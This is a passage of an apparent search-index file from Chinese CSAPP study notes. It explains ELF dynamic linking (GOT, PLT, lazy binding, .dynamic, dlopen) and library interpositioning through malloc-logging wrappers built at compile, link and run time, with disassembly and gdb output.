\u52a8\u6001\u94fe\u63a5"},{"location":"_csapp/_Link/dynlink/#2","text":"\u4f4d\u7f6e\u65e0\u5173\u4ee3\u7801 (position-independent code): \u53ef\u4ee5\u5728\u4e3b\u5b58\u4efb\u610f\u4f4d\u7f6e\u8fd0\u884c\uff0c\u4e0d\u53d7\u7edd\u5bf9\u5730\u5740\u5f71\u54cd\u7684\u4ee3\u7801","title":"2. \u4f4d\u7f6e\u65e0\u5173\u4ee3\u7801"},{"location":"_csapp/_Link/dynlink/#1-global-offset-table","text":"\u52a0\u8f7d\u540e\u518d\u6267\u884c\u91cd\u5b9a\u4f4d\u7684\u96be\u70b9\u5728\u4e8e: \u4f4d\u7f6e\u65e0\u5173\u7684\uff0ci.e. \u7f16\u8bd1\u65f6\u4e0d\u786e\u5b9a _.so \u7684\u5185\u5b58\u5730\u5740\uff0c\u53ef\u4ee5\u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u7684\u4efb\u4f55\u4f4d\u7f6e\u4e0d\u5f71\u54cd\u4f7f\u7528 \u4e0d\u540c\u8fdb\u7a0b\u5171\u4eab _.so \u7684\u4ee3\u7801\u6bb5 .text \uff0c\u4e14\u8fdb\u7a0b\u4ee3\u7801\u533a\u53ea\u8bfb \u65e9\u671f\u5171\u4eab\u5e93\u5728\u8fd0\u884c\u524d\u5c31\u9884\u5148\u5206\u914d\u56fa\u5b9a\u7684\u5185\u5b58\u5730\u5740\uff0c\u867d\u7136\u7b80\u5316\u4e86\u94fe\u63a5\uff0c\u4f46\u5185\u5b58\u7ba1\u7406\u5341\u5206\u6df7\u4e71 \u57fa\u672c\u601d\u8def\u662f\u628a\u4ee3\u7801\u6bb5\u91cd\u5b9a\u4f4d\u65f6\u9700\u8981\u4fee\u6539\u7684\u5730\u65b9\u5206\u79bb\u5230\u6570\u636e\u6bb5\u3002ELF \u7684\u505a\u6cd5\u662f\uff1a \u5728\u6570\u636e\u6bb5\u5efa\u7acb\u4e00\u4e2a\u6307\u9488\u6570\u7ec4 \u2014\u2014 \u5168\u5c40\u504f\u79fb\u8868 (GOT) \u7531\u4e8e\u4ee3\u7801\u6bb5\u548c\u6570\u636e\u6bb5\u8ddd\u79bb\u56fa\u5b9a\uff0c\u7f16\u8bd1\u65f6\u53ef\u4ee5\u8ba9\u4ee3\u7801\u6bb5\u4e2d\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u90e8\u5206\u901a\u8fc7\u76f8\u5bf9\u504f\u79fb\u6307\u5411 GOT \u8fd9\u6837\uff0c\u8fd0\u884c\u65f6 dl \u786e\u5b9a\u5404\u7b26\u53f7\u5730\u5740\u540e\uff0c\u4fee\u6539 GOT \u8fdb\u884c\u91cd\u5b9a\u4f4d\uff1b\u4e0d\u540c\u8fdb\u7a0b\u5171\u4eab _.so \u7684\u4ee3\u7801\u6bb5\uff0c\u4f7f\u7528\u4e0d\u540c\u7684\u6570\u636e\u6bb5\u3002 note \u7ecf\u6d4b\u8bd5 ( gcc 10.2 )\uff0c\u4e0d\u7ba1\u5168\u5c40\u53d8\u91cf\u662f\u5426\u88ab\u5916\u90e8\u52a8\u6001\u5f15\u7528\uff0c\u90fd\u653e\u5728 .data \u6bb5\uff0c\u91cd\u5b9a\u4f4d\u539f\u7406\u662f\u4e0d\u53d8\u7684 dl \u7531 BFS \u6784\u9020\u5168\u5c40\u7b26\u53f7\u8868\u65f6\uff0c\u540e\u6765\u7684\u7b26\u53f7\u4f1a\u88ab\u5148\u524d\u7684\u540c\u540d\u7b26\u53f7\u8986\u76d6\uff1b\u731c\u6d4b\u9759\u6001\u94fe\u63a5\u4e4b\u6240\u4ee5\u6709\u5f31\u7b26\u53f7\u662f\u5386\u53f2\u539f\u56e0\uff0cdl \u7531\u4e8e LD_PRELOAD \u7684\u5b58\u5728\uff0c\u7b26\u53f7\u8986\u76d6\u66f4\u52a0\u65b9\u4fbf","title":"(1). Global Offset Table"},{"location":"_csapp/_Link/dynlink/#2-lazy-binding-procedure-linkage-table","text":"\u53ef\u80fd\u6709\u5f88\u591a\u51fd\u6570\u6839\u672c\u6267\u884c\u4e0d\u5230 (\u4f8b\u5982\u4e00\u4e9b\u9519\u8bef\u5904\u7406\u51fd\u6570)\uff0c\u91cd\u5b9a\u4f4d\u65f6\u628a\u6240\u6709\u51fd\u6570\u5168\u90e8\u94fe\u63a5\u597d\u662f\u6ca1\u6709\u5fc5\u8981\u7684\uff0c\u7531\u6b64 GNU \u91c7\u7528\u5ef6\u8fdf\u7ed1\u5b9a (lazy binding) \u5bf9\u52a8\u6001\u94fe\u63a5\u8fdb\u884c\u4f18\u5316\u3002\u57fa\u672c\u601d\u8def\u4e3a: \u76f4\u5230\u7b2c\u4e00\u6b21\u8c03\u7528\u51fd\u6570 $f$ \u65f6\uff0c\u4ee5 reloc entry \u4e3a\u53c2\u6570\u8c03\u7528 dl\uff0c\u6267\u884c\u91cd\u5b9a\u4f4d \u4ee3\u7801\u533a\u989d\u5916\u5b9a\u4e49\u4e86\u4e00\u4e2a\u8fc7\u7a0b\u94fe\u63a5\u8868 (PLT)\uff0c\u901a\u8fc7 GOT \u548c PLT \u7684\u534f\u4f5c\u5b9e\u73b0\u5bf9\u51fd\u6570\u7684\u5ef6\u8fdf\u7ed1\u5b9a\u3002\u5177\u4f53\u5b9e\u73b0\u4e0a\uff0c ELF \u5c06 .got \u62c6\u5206\u6210\u4e24\u4e2a\u90e8\u5206: .got.plt : \u4fdd\u5b58\u51fd\u6570\u7684\u5730\u5740 .got.plt[0] : \u2002 addr of .dynamic section .got.plt[1] : \u2002 addr of reloc entries .got.plt[2] : \u2002 \u52a8\u6001\u94fe\u63a5\u5668 ld-linux.so \u7684\u5165\u53e3\u70b9 .got : \u4fdd\u5b58\u5168\u5c40\u53d8\u91cf\u7684\u5730\u5740 example: \u2002 progd \u7528 readelf \u67e5\u770b progd \u7684 GOT \u548c PLT \u8868 (\u8fd0\u884c\u524d\uff0c\u5173\u95ed\u6808\u968f\u673a\u5316): disas of .plt Disassembly of section .plt : 0000000000401020 < .plt >: 401020: ff 35 e2 2f 00 00 pushq 0x2fe2(%rip) # 404008 <_GLOBAL_OFFSET_TABLE_+0x8> 401026: ff 25 e4 2f 00 00 jmpq *0x2fe4(%rip) # 404010 <_GLOBAL_OFFSET_TABLE_+0x10> 40102c: 0f 1f 40 00 nopl 0x0(%rax) 0000000000401030 < printf@plt >: 401030: ff 25 e2 2f 00 00 jmpq *0x2fe2(%rip) # 404018 <printf@GLIBC_2.2.5> 401036: 68 00 00 00 00 pushq $0x0 40103b: e9 e0 ff ff ff jmpq 401020 <.plt> 0000000000401040 < addvec@plt >: 401040: ff 25 da 2f 00 00 jmpq *0x2fda(%rip) # 404020 <addvec> 401046: 68 01 00 00 00 pushq $0x1 40104b: e9 d0 ff ff ff jmpq 401020 <.plt> view \u2002.got.plt $ readelf -x .got.plt progd NOTE: This section has relocations against it, but these have NOT been applied to this dump. 0x00404000: 003e4000 00000000 00000000 00000000 .>@............. 0x00404010: 00000000 00000000 36104000 00000000 ........6.@..... 0x00404020: 46104000 00000000 F.@..... view \u2002.dynamic $ readelf -x .dynamic progd 0x00403e00 01000000 00000000 66000000 00000000 ........f....... 0x00403e10 01000000 00000000 75000000 00000000 ........u....... ... ... \u4ece\u4e2d\u63d0\u53d6\u4fe1\u606f\uff0c\u603b\u7ed3\u4e3a\u4e0b\u56fe \u5728\u63a7\u5236\u4ea4\u7ed9 progd \u540e\uff0c\u6b64\u65f6 dl \u5df2\u7ecf\u786e\u5b9a\u4e86\u6240\u6709\u51fd\u6570\u7684\u8fd0\u884c\u65f6\u5730\u5740\u3002\u5f53 addvec \u7b2c\u4e00\u6b21\u88ab\u8c03\u7528\u65f6: \u2460. \u4e0d\u76f4\u63a5\u8c03\u7528 addvec \uff0c\u5148\u8fdb\u5165\u5b83\u7684 PLT \u6761\u76ee .plt[2] \u2461. \u8df3\u8f6c\u5230 .got.plt[4] \uff0c\u800c\u5b83\u6307\u5411 .plt[2] \u7684\u7b2c\u4e8c\u6761\u6307\u4ee4\uff0c\u7b49\u4ef7\u4e8e\u6267\u884c\u4e0b\u4e00\u6761\u8bed\u53e5 \u2462. \u628a addvec \u7684 ID 0x1 \u538b\u5165\u6808\u4e2d\uff0c\u8df3\u8f6c\u5230 .plt[0] \uff0c\u628a dl \u9700\u8981\u7684\u53c2\u6570\u538b\u5165\u6808\u4e2d \u2463. \u95f4\u63a5\u8df3\u8f6c\u5230 dl \u4e2d\uff0c\u6b64\u65f6\u6808\u4e2d\u6709 0x1 \u548c .got.plt[1] \u4e24\u4e2a\u53c2\u6570\uff0cdl \u6839\u636e\u53c2\u6570\u786e\u5b9a addvec \u7684\u8fd0\u884c\u65f6\u5730\u5740\uff0c\u91cd\u5b9a\u4f4d .got.plt[4] \uff0c\u7136\u540e\u628a\u63a7\u5236\u4ea4\u8fd8\u7ed9 addvec \u901a\u8fc7 gdb \u67e5\u770b\u5ef6\u8fdf\u7ed1\u5b9a\u7684\u8fc7\u7a0b gdb commands $ gdb progd ... $ ( gdb ) b* 0x401154 Breakpoint 1 at 0x401154 $ ( gdb ) b* 0x401159 Breakpoint 2 at 0x401159 $ ( gdb ) run Breakpoint 1, 0x0000000000401154 in main () $ ( gdb ) info functions ^printf$ 0x00007ffff7e1cb10 printf $ ( gdb ) info functions ^addvec$ 0x00007ffff7fc40e9 addvec $ ( gdb ) maint info sections ... ... [19] 0x00403e00->0x00403fe0 at 0x00002e00: .dynamic ALLOC LOAD DATA HAS_CONTENTS [20] 0x00403fe0->0x00404000 at 0x00002fe0: .got ALLOC LOAD DATA HAS_CONTENTS [21] 0x00404000->0x00404028 at 0x00003000: .got.plt ALLOC LOAD DATA HAS_CONTENTS [22] 0x00404028->0x00404048 at 0x00003028: .data ALLOC LOAD DATA HAS_CONTENTS [23] 0x00404048->0x00404058 at 0x00003048: .bss ALLOC ... ... $ ( gdb ) x/5xg 0x404000 0x404000: 0x0000000000403e00 0x00007ffff7ffe1a0 0x404010: 0x00007ffff7fe7d30 0x0000000000401036 0x404020 <addvec@got.plt>: 0x0000000000401046 $ ( gdb ) continue Continuing. Breakpoint 2, 0x0000000000401159 in main () $ ( gdb ) x/5xg 0x404000 0x404000: 0x0000000000403e00 0x00007ffff7ffe1a0 0x404010: 0x00007ffff7fe7d30 0x0000000000401036 0x404020 <addvec@got.plt>: 0x00007ffff7fc40e9 disas of main 0000000000401136 < main >: 401136: 55 push %rbp 401137: 48 89 e5 mov %rsp,%rbp 40113a: b9 02 00 00 00 mov $0x2,%ecx 40113f: 48 8d 15 0a 2f 00 00 lea 0x2f0a(%rip),%rdx # 404050 <z> 401146: 48 8d 35 f3 2e 00 00 lea 0x2ef3(%rip),%rsi # 404040 <y> 40114d: 48 8d 3d e4 2e 00 00 lea 0x2ee4(%rip),%rdi # 404038 <x> 401154: e8 e7 fe ff ff callq 401040 <addvec@plt> 401159: 8b 15 f5 2e 00 00 mov 0x2ef5(%rip),%edx # 404054 <z+0x4> 40115f: 8b 05 eb 2e 00 00 mov 0x2eeb(%rip),%eax # 404050 <z> 401165: 89 c6 mov %eax,%esi 401167: 48 8d 3d 96 0e 00 00 lea 0xe96(%rip),%rdi # 402004 <_IO_stdin_used+0x4> 40116e: b8 00 00 00 00 mov $0x0,%eax 401173: e8 b8 fe ff ff callq 401030 <printf@plt> 401178: b8 00 00 00 00 mov $0x0,%eax 40117d: 5d pop %rbp 40117e: c3 retq 40117f: 90 nop","title":"(2). Lazy Binding &amp; Procedure Linkage Table"},{"location":"_csapp/_Link/dynlink/#3","text":"","title":"3. \u76f8\u5173\u6570\u636e\u7ed3\u6784"},{"location":"_csapp/_Link/dynlink/#1-interp","text":"\u52a8\u6001\u94fe\u63a5\u5668\u7684\u8def\u5f84\u7531 ELF \u6587\u4ef6\u51b3\u5b9a\uff0c\u4ee5\u5b57\u7b26\u4e32\u7684\u5f62\u5f0f\u4fdd\u5b58\u5728 .interp \u4e2d\u3002 $ readelf -l progd | grep interpreter [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]","title":"(1). .interp"},{"location":"_csapp/_Link/dynlink/#2-dynamic","text":".dynamic \u5bf9\u52a8\u6001\u94fe\u63a5\u6765\u8bf4\u662f\u6700\u91cd\u8981\u7684\u7ed3\u6784\uff0c\u4fdd\u5b58\u4e86\u4ee5\u4e0b\u57fa\u672c\u4fe1\u606f: \u53ef\u6267\u884c\u7a0b\u5e8f\u4f9d\u8d56\u4e8e\u54ea\u4e9b\u5171\u4eab\u5bf9\u8c61 \u52a8\u6001\u94fe\u63a5\u7b26\u53f7\u8868\u7684\u4f4d\u7f6e, \u52a8\u6001\u94fe\u63a5\u91cd\u5b9a\u4f4d\u8868\u7684\u4f4d\u7f6e \u5171\u4eab\u5bf9\u8c61\u521d\u59cb\u5316\u4ee3\u7801\u7684\u5730\u5740 \u7b49 typedef struct { Elf64_Sxword d_tag ; /* Dynamic entry type */ union { Elf64_Xword d_val ; /* Integer value */ Elf64_Addr d_ptr ; /* Address value */ } d_un ; } Elf64_Dyn ; .dynamic \u4e5f\u662f\u4e00\u4e2a\u7ed3\u6784\u6570\u7ec4\uff0c\u7531\u7c7b\u578b\u503c d_tag \u548c\u9644\u52a0\u7684\u6570\u636e\u7ec4\u6210\u3002\u4e00\u4e9b\u5e38\u89c1\u7684\u7c7b\u578b\u6709: value of d_tag meaning of d_un DT_SYMTAB \u52a8\u6001\u94fe\u63a5\u7b26\u53f7\u8868\u7684\u5730\u5740\uff0c d_ptr \u8868\u793a .dynsym \u7684\u5730\u5740 DT_STRTAB \u52a8\u6001\u94fe\u63a5\u5b57\u7b26\u4e32\u8868\u7684\u5730\u5740\uff0c d_ptr \u8868\u793a .dynstr \u7684\u5730\u5740 DT_STRSZ \u52a8\u6001\u94fe\u63a5\u5b57\u7b26\u4e32\u5927\u5c0f\uff0c d_val \u8868\u793a\u5927\u5c0f DT_HASH \u52a8\u6001\u94fe\u63a5 hash \u8868\u5730\u5740\uff0c d_ptr \u8868\u793a .hash \u7684\u5730\u5740 DT_INIT \u521d\u59cb\u5316\u4ee3\u7801\u5730\u5740 DT_NEED \u4f9d\u8d56\u7684\u5171\u4eab\u5e93\u6587\u4ef6\uff0c d_ptr \u8868\u793a\u6587\u4ef6\u540d DT_REL / DT_RELA \u52a8\u6001\u94fe\u63a5\u91cd\u5b9a\u4f4d\u8868\u5730\u5740","title":"(2). .dynamic"},{"location":"_csapp/_Link/dynlink/#3-dynsym","text":"\u4e3a\u4e86\u8868\u793a \u52a8\u6001\u94fe\u63a5\u6a21\u5757 \u4e4b\u95f4\u7684\u7b26\u53f7\u5f15\u7528\u5173\u7cfb\uff0cELF \u4e13\u95e8\u5b9a\u4e49\u4e86\u4e00\u4e2a\u52a8\u6001\u7b26\u53f7\u8868 .dynsym \uff0centry \u7ed3\u6784\u548c\u9759\u6001\u94fe\u63a5\u76f8\u540c \u52a8\u6001\u94fe\u63a5\u6a21\u5757\u901a\u5e38\u6709 symtab \u548c dynsym \u4e24\u4e2a\u7b26\u53f7\u8868 \u548c .symtab \u4e0d\u540c\u7684\u662f\uff0c .dynsym \u4e0d\u4fdd\u5b58\u6a21\u5757\u79c1\u6709\u9759\u6001\u53d8\u91cf\uff0c .dynsym \u901a\u5e38\u662f .symtab \u7684\u5b50\u96c6 \u53ef\u4ee5\u5728\u8fd0\u884c\u65f6\u4f7f\u7528 gdb \u67e5\u770b\u5404\u4e2a\u7b26\u53f7\u88ab dl \u5206\u914d\u7684\u5730\u5740 \u548c .symtab \u7c7b\u4f3c\uff0c .dynsym \u4e5f\u6709\u8f85\u52a9\u7684\u5b57\u7b26\u4e32\u8868 .dynstr","title":"(3). .dynsym"},{"location":"_csapp/_Link/dynlink/#4-reloc-entry","text":"entry \u7684\u7ed3\u6784\u548c\u9759\u6001\u94fe\u63a5\u4e00\u6837; .rel.dyn \u548c .rel.plt \u5206\u522b\u8d1f\u8d23\u4fee\u6b63 .got \u548c .got.plt \u3002 $ readelf -r progd $ readelf -r progd \u91cd\u5b9a\u4f4d\u8282 '.rela.dyn' at offset 0x490 contains 4 entries: \u504f\u79fb\u91cf \u4fe1\u606f \u7c7b\u578b \u7b26\u53f7\u503c \u7b26\u53f7\u540d\u79f0 + \u52a0\u6570 000000403fe0 000100000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_deregisterTM[...] + 0 000000403fe8 000300000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0 000000403ff0 000500000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0 000000403ff8 000600000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_registerTMCl[...] + 0 \u91cd\u5b9a\u4f4d\u8282 '.rela.plt' at offset 0x4f0 contains 2 entries: \u504f\u79fb\u91cf \u4fe1\u606f \u7c7b\u578b \u7b26\u53f7\u503c \u7b26\u53f7\u540d\u79f0 + \u52a0\u6570 000000404018 000200000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0 000000404020 000400000007 R_X86_64_JUMP_SLO 0000000000000000 addvec + 0","title":"(4). reloc entry"},{"location":"_csapp/_Link/dynlink/#4","text":"Linux \u63d0\u4f9b\u4e86 dynamic linker \u7684\u7b80\u5355\u63a5\u53e3\uff0c\u5141\u8bb8\u7a0b\u5e8f\u8fd0\u884c\u65f6\u663e\u5f0f\u52a0\u8f7d\u548c\u94fe\u63a5\u5171\u4eab\u5e93\u3002 interfaces #include <dlfcn.h> /* \u52a0\u8f7d\u548c\u94fe\u63a5\u5171\u4eab\u5e93 filename * @flag: RTLD_NOW: \u7acb\u5373\u89e3\u6790\u5916\u90e8\u7b26\u53f7\u5f15\u7528; RTLD_LAZY: \u5ef6\u8fdf\u89e3\u6790. */ void * dlopen ( const char * filename , int flag ); /* \u5982\u679c\u7b26\u53f7\u5b58\u5728\uff0c\u8fd4\u56de\u7b26\u53f7\u7684\u5730\u5740 * @handle: \u5171\u4eab\u5e93\u7684\u53e5\u67c4 * @symbol: \u5171\u4eab\u5e93\u7684\u7b26\u53f7\u540d */ void * dlsym ( void * handle , char * symbol ); /* \u5982\u679c\u6ca1\u6709\u5176\u4ed6\u5171\u4eab\u5e93\u4f7f\u7528\u8fd9\u4e2a\u5171\u4eab\u5e93\uff0c\u5378\u8f7d\u5b83 */ int dlclose ( void * handle ); /* \u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u63cf\u8ff0 dlopen, dlsym, dlclose \u6700\u8fd1\u7684\u9519\u8bef */ const char * dlerror ( void ); example:\u2002\u52a8\u6001\u94fe\u63a5 libvector.so \uff0c\u5e76\u8c03\u7528 addvec dll.c #include <dlfcn.h> #include <stdio.h> #include <stdlib.h> int x [ 2 ] = { 1 , 2 }; int y [ 2 ] = { 3 , 4 }; int z [ 2 ]; int main () { void * handle ; void ( * addvec )( int * , int * , int * , int ); char * error ; /* dynamically load the shared library containing addvec() */ handle = dlopen ( \"./libvector.so\" , RTLD_LAZY ); if ( ! handle ) { fprintf ( stderr , \"%s \\n \" , dlerror ()); exit ( 1 ); } /* Get a pointer to the addvec() function we just loaded */ addvec = dlsym ( handle , \"addvec\" ); if (( error = dlerror ()) != NULL ) { fprintf ( stderr , \"%s \\n \" , error ); exit ( 1 ); } /* Now we can call addvec() just like any other function */ addvec ( x , y , z , 2 ); printf ( \"z = [%d %d] \\n \" , z [ 0 ], z [ 1 ]); /* Unload the shared library */ if ( dlclose ( handle ) < 0 ) { fprintf ( stderr , \"%s \\n \" , dlerror ()); exit ( 1 ); } return 0 ; } console $ gcc -rdynamic -o progd2 dll.c -ldl","title":"4. \u663e\u5f0f\u52a8\u6001\u94fe\u63a5"},{"location":"_csapp/_Link/dynlink/#5","text":"Linux \u652f\u6301\u5e93\u6253\u6869 (library interpositioning) \u6280\u672f\uff0c\u53ef\u4ee5\u622a\u83b7\u5bf9\u5171\u4eab\u5e93\u51fd\u6570\u7684\u8c03\u7528\uff0c\u6267\u884c\u81ea\u5df1\u7684\u4ee3\u7801\u3002","title":"5. \u5e93\u6253\u6869"},{"location":"_csapp/_Link/dynlink/#1_1","text":"int.c #include <malloc.h> // local dir #include <stdio.h> int main () { int * p = malloc ( 32 ); free ( p ); return 0 ; } mymalloc.c #ifdef COMPILETIME #include <malloc.h> // system dir #include <stdio.h> /* malloc wrapper function */ void * mymalloc ( size_t size ) { void * ptr = malloc ( size ); printf ( \"malloc(%d)=%p \\n \" , ( int ) size , ptr ); return ptr ; } /* free wrapper function */ void myfree ( void * ptr ) { free ( ptr ); printf ( \"free(%p) \\n \" , ptr ); } #endif malloc.h #define malloc(size) mymalloc(size) #define free(ptr) myfree(ptr) #include <stdio.h> void * mymalloc ( size_t size ); void myfree ( void * ptr ); run intc $ gcc -DCOMPILETIME -c mymalloc.c $ gcc -I. -o intc int.c mymalloc.o $ ./intc malloc(32)=0x5628b97c92a0 free(0x5628b97c92a0) -I. \u544a\u8bc9 C \u9884\u5904\u7406\u5668\uff0c\u641c\u7d22\u7cfb\u7edf\u76ee\u5f55\u4e4b\u524d\u5148\u5728\u5f53\u524d\u76ee\u5f55\u627e malloc.h -D \u7f16\u8bd1\u65f6\u5f00\u542f\u67d0\u4e2a\u5b8f","title":"(1). \u7f16\u8bd1\u65f6\u6253\u6869"},{"location":"_csapp/_Link/dynlink/#2_1","text":"int.c #include <malloc.h> // local dir #include <stdio.h> int main () { int * p = malloc ( 32 ); free ( p ); return 0 ; } mymalloc.c #ifdef LINKTIME #include <stdio.h> void * __real_malloc ( size_t size ); void __real_free ( void * ptr ); /* malloc wrapper function */ void * __wrap_malloc ( size_t size ) { void * ptr = __real_malloc ( size ); /* call libc malloc */ printf ( \"malloc(%d) = %p \\n \" , ( int ) size , ptr ); return ptr ; } /* free wrapper function */ void __wrap_free ( void * ptr ) { __real_free ( ptr ); /* call libc free */ printf ( \"free(%p) \\n \" , ptr ); } #endif run intl $ gcc -DLINKTIME -c mymalloc.c $ gcc -c int.c $ gcc -Wl,--wrap,malloc -Wl,--wrap,free -o intl int.o mymalloc.o $ ./intl malloc(32) = 0x55e39f2d22a0 free(0x55e39f2d22a0) --wrap f :\u2002 \u628a\u5bf9 f \u7684\u5f15\u7528\u89e3\u6790\u4e3a __wrap_f \uff0c\u5e76\u4e14\u628a\u5bf9 __real_f \u7684\u5f15\u7528\u89e3\u6790\u4e3a f","title":"(2). \u94fe\u63a5\u65f6\u6253\u6869"},{"location":"_csapp/_Link/dynlink/#3_1","text":"\u7f16\u8bd1\u65f6\u6253\u6869\u9700\u8981\u80fd\u8bbf\u95ee\u6e90\u4ee3\u7801\uff0c\u94fe\u63a5\u65f6\u6253\u6869\u9700\u8981\u80fd\u8bbf\u95ee\u76ee\u6807\u6587\u4ef6\uff0c\u800c\u8fd0\u884c\u65f6\u6253\u6869\u53ea\u9700\u8981\u80fd\u8bbf\u95ee\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u4f9d\u8d56\u4e8e\u52a8\u6001\u94fe\u63a5\u5668\u7684\u73af\u5883\u53d8\u91cf LD_PRELOAD : \u82e5 LD_PRELOAD \u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u8def\u5f84\u5217\u8868\uff0c\u52a0\u8f7d\u4e00\u4e2a\u7a0b\u5e8f\u65f6\uff0c ld-linux.so \u4f1a\u5148\u641c\u7d22 LD_PRELOAD \u7684\u5185\u5bb9\uff0c\u7136\u540e\u518d\u641c\u7d22\u5176\u4ed6\u7684\u5e93 \u56e0\u6b64\u53ef\u4ee5\u5bf9\u4efb\u4f55\u5171\u4eab\u5e93\u7684\u4efb\u4f55\u51fd\u6570\u6253\u6869\uff0c\u5305\u62ec libc.so int.c #include <malloc.h> // local dir #include <stdio.h> int main () { int * p = malloc ( 32 ); free ( p ); return 0 ; } mymalloc.c #ifdef RUNTIME #define _GNU_SOURCE #include <dlfcn.h> #include <stdio.h> #include <stdlib.h> /* malloc wrapper function */ void * malloc ( size_t size ) { void * ( * mallocp )( size_t size ); char * error ; mallocp = dlsym ( RTLD_NEXT , \"malloc\" ); /* get addr of libc malloc */ if (( error = dlerror ()) != NULL ) { fputs ( error , stderr ); exit ( 1 ); } char * ptr = mallocp ( size ); /* call libc malloc */ fprintf ( stderr , \"malloc(%d) = %p \\n \" , ( int ) size , ptr ); return ptr ; } /* free wrapper function */ void free ( void * ptr ) { void ( * freep )( void * ) = NULL ; char * error ; if ( ! ptr ) return ; freep = dlsym ( RTLD_NEXT , \"free\" ); /* get addr of libc free */ if (( error = dlerror ()) != NULL ) { fputs ( error , stderr ); exit ( 1 ); } freep ( ptr ); fprintf ( stderr , \"free(%p) \\n \" , ptr ); } #endif run intr $ gcc -DRUNTIME -shared -fpic -o mymalloc.so mymalloc.c -ldl $ gcc -o intr int.c $ LD_PRELOAD = \"./mymalloc.so\" ./intr malloc(32) = 0x55a0927a12a0 free(0x55a0927a12a0) $ LD_PRELOAD = \"./mymalloc.so\" /usr/bin/uptime ... mymalloc.c \u4e2d\u4e0d\u53ef\u4f7f\u7528 printf \uff0c printf \u4f3c\u4e4e\u4e5f\u4f1a\u8c03\u7528 malloc \uff0c\u56e0\u800c\u9020\u6210\u65e0\u7a77\u9012\u5f52\u3002","title":"(3). \u8fd0\u884c\u65f6\u6253\u6869"},{"location":"_csapp/_Link/object_file/","text":"1. \u7f16\u8bd1\u8fc7\u7a0b \ud83e\uddd0 main.c #include <stdio.h> void hello ( void ); int main () { hello (); return 0 ; } hello.c #include <stdio.h> void hello () { printf ( \"hello world!\" ); } compiler driver \u5c06\u6e90\u6587\u4ef6\u7ffb\u8bd1\u4e3a\u53ef\u6267\u884c\u6587\u4ef6\u7684\u8fc7\u7a0b: C \u9884\u5904\u7406\u5668 (cpp) \u5c06\u6e90\u7a0b\u5e8f main.c \u7ffb\u8bd1\u4e3a ascii \u4e2d\u95f4\u6587\u4ef6 main.i C \u7f16\u8bd1\u5668 (cc1) \u5c06 main.i \u7ffb\u8bd1\u4e3a ascii \u6c47\u7f16\u6587\u4ef6 main.s \u6c47\u7f16\u5668 (as) \u5c06 main.s \u7ffb\u8bd1\u4e3a\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6 main.o \u94fe\u63a5\u5668 ld \u5c06\u6240\u6709 .o \u548c\u5fc5\u8981\u7684\u7cfb\u7edf\u76ee\u6807\u6587\u4ef6\u7ed3\u5408\uff0c\u521b\u5efa\u53ef\u6267\u884c\u6587\u4ef6 \u6700\u540e\uff0cshell \u8c03\u7528 loader\uff0c\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u7684\u4ee3\u7801\u548c\u6570\u636e\u590d\u5236\u5230\u5185\u5b58\uff0c\u5e76\u5c06\u63a7\u5236\u8f6c\u79fb\u5230\u5b83\u7684\u5f00\u5934 $ cpp -o ./tmp/main.i main.c $ /usr/lib/gcc/x86_64-pc-linux-gnu/10.2.0/cc1 -o ./tmp/main.s ./tmp/main.i $ as -o ./tmp/main.o ./tmp/main.s $ ld -o prog -dynamic-linker /lib64/ld-linux-x86-64.so.2 /usr/lib/crt1.o /usr/lib/crti.o /usr/lib/crtn.o /usr/lib/libc.so ./tmp/main.o $ ./prog 2. \u76ee\u6807\u6587\u4ef6 \ud83e\uddd0 (1). \u5206\u7c7b \ud83e\uddd0 objected files come in three forms: executable object file: \u5f53\u524d\u6d41\u884c\u7684\u683c\u5f0f\u4e3b\u8981\u4e3a Windows \u7684 PE & Linux \u7684 ELF\uff0c\u53ef\u4ee5\u76f4\u63a5\u52a0\u8f7d\u5230\u5185\u5b58\u6267\u884c relocatable object file (Windows: .obj & Linux: .o ): \u7528\u4e8e\u94fe\u63a5\u6210\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab\u76ee\u6807\u6587\u4ef6 shared object file (Windows: .dll & Linux: .so ): \u53ef\u4ee5\u4e0e\u5176\u4ed6\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6/\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u94fe\u63a5\uff0c\u4ea7\u751f\u65b0\u7684\u76ee\u6807\u6587\u4ef6\uff1b\u4e5f\u53ef\u4ee5\u4e0e\u53ef\u6267\u884c\u6587\u4ef6\u7ed3\u5408\uff0c\u4f5c\u4e3a\u8fdb\u7a0b\u6620\u50cf\u7684\u4e00\u90e8\u5206\u8fd0\u884c \u53ef\u6267\u884c\u6587\u4ef6\u683c\u5f0f\u7684\u5386\u53f2 Unix \u6700\u65e9\u7684\u53ef\u6267\u884c\u6587\u4ef6\u683c\u5f0f\u662f a.out\uff0c\u4f46\u7531\u4e8e\u5176\u8bbe\u8ba1\u8fc7\u4e8e\u7b80\u5355\uff0c\u65e0\u6cd5\u9002\u5e94\u5171\u4eab\u5e93\u7684\u6982\u5ff5\uff1bUnix System V Release 3 \u9996\u5148\u63d0\u51fa\u5e76\u4f7f\u7528\u4e86 COFF \u683c\u5f0f\uff0c\u5fae\u8f6f\u57fa\u4e8e COFF \u63d0\u51fa\u4e86 PE \u683c\u5f0f\u6807\u51c6\uff1bSystem V Release 4 \u5f15\u5165\u4e86 ELF \u683c\u5f0f\uff0c\u4e5f\u5c31\u662f\u5f53\u524d Linux \u7684\u53ef\u6267\u884c\u6587\u4ef6\u683c\u5f0f\u3002 (2). \u683c\u5f0f \ud83e\uddd0 \u5178\u578b\u7684 ELF \u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u5305\u542b\u4ee5\u4e0b section (\u4ee3\u7801\u533a\u3001\u6570\u636e\u533a\u3001\u8f85\u52a9(\u94fe\u63a5/\u8c03\u8bd5)\u533a): section description .text 